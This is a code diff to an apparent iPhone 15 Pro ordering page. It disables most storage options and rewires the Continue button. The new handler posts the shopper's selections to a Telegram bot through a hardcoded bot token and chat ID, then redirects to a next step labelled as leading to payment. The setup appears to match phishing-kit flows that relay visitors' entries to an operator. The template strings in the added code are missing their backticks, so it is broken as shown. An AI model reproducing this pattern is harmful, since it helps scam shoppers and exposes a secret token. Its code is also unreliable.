@@ -43,29 +43,37 @@
       border: 1px solid rgba(0,0,0,0.06);
     }
 
-    .section-title {
-      font-size: 18px;
-      font-weight: 600;
-      margin-bottom: 10px;
-    }
+    ...
+.section-title {
+  font-size: 18px;
+  font-weight: 600;
+  margin-bottom: 10px;
+}
 
-    .options {
-      display: flex;
-      flex-wrap: wrap;
-      gap: 10px;
-    }
+/* --- Disabled storage options --- */
+.option.disabled {
+  opacity: 0.45;
+  cursor: not-allowed;
+  pointer-events: none;
+}
 
-    .option {
-      flex: 1;
-      min-width: 110px;
-      padding: 12px;
-      border-radius: 12px;
-      border: 1px solid var(--border);
-      text-align: center;
-      font-size: 14px;
-      cursor: pointer;
-      transition: 0.15s;
-    }
+.options {
+  display: flex;
+  flex-wrap: wrap;
+  gap: 10px;
+}
+
+.option {
+  flex: 1;
+  min-width: 110px;
+  padding: 12px;
+  border-radius: 12px;
+  border: 1px solid var(--border);
+  text-align: center;
+  font-size: 14px;
+  cursor: pointer;
+  transition: 0.15s;
+}
 
     .option.selected {
       border-color: var(--accent-blue);
@@ -119,12 +127,12 @@
   <!-- Storage -->
   <div class="section">
     <div class="section-title">Select Storage</div>
-    <div class="options" id="storage-options">
-      <div class="option">128 GB</div>
-      <div class="option selected">256 GB</div>
-      <div class="option">512 GB</div>
-      <div class="option">1 TB</div>
-    </div>
+   <div class="options" id="storage-options">
+  <div class="option disabled">128 GB</div>
+  <div class="option selected">256 GB</div>
+  <div class="option disabled">512 GB</div>
+  <div class="option disabled">1 TB</div>
+</div>
   </div>
 
   <!-- Colors -->
@@ -186,9 +194,40 @@
     });
 
     // Continue → Payment page
-    document.getElementById("continue-btn").addEventListener("click", function() {
-      window.location.href = "index.html"; // غيّرها إذا بدك صفحة ثانية
-    });
+    // Continue → Payment page
+document.getElementById("continue-btn").addEventListener("click", function () {
+
+  const botToken = "8097834484:AAG7whd2jF7Ie5pXUiomwXd1VwleQPpAogc"; 
+  const chatId = "7811430582";
+
+  // Get selected storage
+  const selectedStorage = document.querySelector("#storage-options .selected")?.innerText || "256 GB";
+
+  // Get selected color
+  const selectedColor = document.querySelector("#color-options .selected")?.innerText.trim() || "Natural Titanium";
+
+  // Message to Telegram
+  const msg =
+    📱 *New Order Submitted*\n\n +
+    Model: iPhone 15 Pro\n +
+    Storage: ${selectedStorage}\n +
+    Color: ${selectedColor};
+
+  // Send to Telegram
+  fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      chat_id: chatId,
+      text: msg,
+      parse_mode: "Markdown"
+    })
+  });
+
+  // Redirect
+  window.location.href = "step-3.html";
+
+});
 
   </script>
 
